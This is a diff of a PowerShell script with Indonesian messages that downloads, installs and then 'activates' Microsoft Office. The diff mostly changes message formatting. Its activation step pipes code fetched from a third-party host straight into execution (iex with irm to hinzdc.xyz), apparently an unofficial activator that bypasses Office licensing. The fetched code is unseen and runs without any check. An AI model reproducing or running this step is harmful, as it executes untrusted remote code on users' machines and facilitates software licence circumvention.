@@ -9,9 +9,9 @@ $downloadPath = "C:\OfficeInstall"
 if (-not (Test-Path -Path $downloadPath)) {
     try {
         New-Item -Path $downloadPath -ItemType Directory -Force | Out-Null
-        Write-Host " ✓ Folder $downloadPath berhasil dibuat." -ForegroundColor Green
+        Write-Host " + Folder $downloadPath berhasil dibuat." -ForegroundColor Green
     } catch {
-        Write-Host " ✕ Gagal membuat folder $downloadPath. Error: $_" -ForegroundColor Red
+        Write-Host " - Gagal membuat folder $downloadPath. Error: $_" -ForegroundColor Red
         exit 1
     }
 }
@@ -24,14 +24,14 @@ function Download-File {
     )
     
     try {
+        Write-Host " + Mengunduh $url ke $destination..."
         Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction Stop
-        Write-Host " + Mengunduh file yang diperlukan.."
+        Write-Host " + File diunduh ke $destination." -ForegroundColor Green
+        return $true
     } catch {
-        Write-Host " ✕ Gagal mengunduh $url ke $destination. Error: $_"
+        Write-Host " - Gagal mengunduh $url ke $destination. Error: $_" -ForegroundColor Red
         return $false
     }
-    
-    return $true
 }
 
 # Unduh file setup.exe dan configure.xml
@@ -40,45 +40,50 @@ $configDownloaded = Download-File -url $urlConfigureXml -destination "$downloadP
 
 # Cek apakah kedua file telah berhasil diunduh
 if ($setupDownloaded -and $configDownloaded) {
-    Write-Host " ✓ Semua file berhasil diunduh." -ForegroundColor Green
+    Write-Host " + Semua file berhasil diunduh." -ForegroundColor Green
     
     # Eksekusi setup.exe dengan menggunakan konfigurasi dari configure.xml
     try {
-        Write-Host " + Installing Office.."
-        Write-Host "   Please wait.."
+        Write-Host " + Installing Office..."
+        Write-Host "   Please wait..."
         Start-Process -FilePath "$downloadPath\setup.exe" -ArgumentList "/configure $downloadPath\configure.xml" -Wait -NoNewWindow -ErrorAction Stop
-        Write-Host " ✓ Install Office selesai." -ForegroundColor Green
+        Write-Host " + Install Office selesai." -ForegroundColor Green
     } catch {
-        Write-Host " ✕ Gagal menjalankan setup.exe. Error: $_"
+        Write-Host " - Gagal menjalankan setup.exe. Error: $_" -ForegroundColor Red
         exit 1
     }
     
     # Hentikan proses OfficeC2RClient.exe
     try {
         Write-Host " + Hentikan Proses OfficeC2RClient.exe"
-        Stop-Process -Name "OfficeC2RClient" -Force -ErrorAction Stop | Out-Null
-
+        $stopProcessJob = Start-Job -ScriptBlock {
+            Stop-Process -Name "OfficeC2RClient" -Force -ErrorAction Stop
+        }
+        Wait-Job -Job $stopProcessJob
+        Receive-Job -Job $stopProcessJob | Out-Null
+        Remove-Job -Job $stopProcessJob
+        Write-Host " + Proses OfficeC2RClient.exe dihentikan." -ForegroundColor Green
     } catch {
-        Write-Host " ✕ Gagal menghentikan proses OfficeC2RClient.exe. Error: $_" -ForegroundColor Red
+        Write-Host " - Gagal menghentikan proses OfficeC2RClient.exe. Error: $_" -ForegroundColor Red
     }
 
     # Cek apakah instalasi Microsoft Office telah selesai
     $officePath = "C:\Program Files\Microsoft Office\root\Office16"
     if (Test-Path -Path $officePath) {
-        Write-Host " ✓ Microsoft Office telah diinstal." -ForegroundColor Green
-        Start-Sleep -5
+        Write-Host " + Microsoft Office telah diinstal." -ForegroundColor Green
+        Start-Sleep -Seconds 5
         # Eksekusi perintah setelah instalasi Microsoft Office selesai
         try {
-            Write-Host " + Activating Office.." -ForegroundColor Green
-            iex(irm hinzdc.xyz/get/activeauto)
+            Write-Host " + Activating Office..." -ForegroundColor Green
+            iex (irm https://hinzdc.xyz/get/activeauto)
             Write-Host "------------------------------------------------------------"
-            Write-Host " INSTALL DAN AKTIVASI OFFICE SUDAH SELESAI.." -BackgroundColor Green -ForegroundColor White
+            Write-Host " INSTALL DAN AKTIVASI OFFICE SUDAH SELESAI." -BackgroundColor Green -ForegroundColor White
         } catch {
-            Write-Host " ✕ Gagal menjalankan perintah Activasi. Error: $_"
+            Write-Host " - Gagal menjalankan perintah aktivasi. Error: $_" -ForegroundColor Red
         }
     } else {
-        Write-Host " ✕ Instalasi Microsoft Office gagal atau folder tidak ditemukan." -ForegroundColor Red
+        Write-Host " - Instalasi Microsoft Office gagal atau folder tidak ditemukan." -ForegroundColor Red
     }
 } else {
-    Write-Host " ✕ Gagal mengunduh satu atau lebih file." -ForegroundColor Red
+    Write-Host " - Gagal mengunduh satu atau lebih file." -ForegroundColor Red
 }
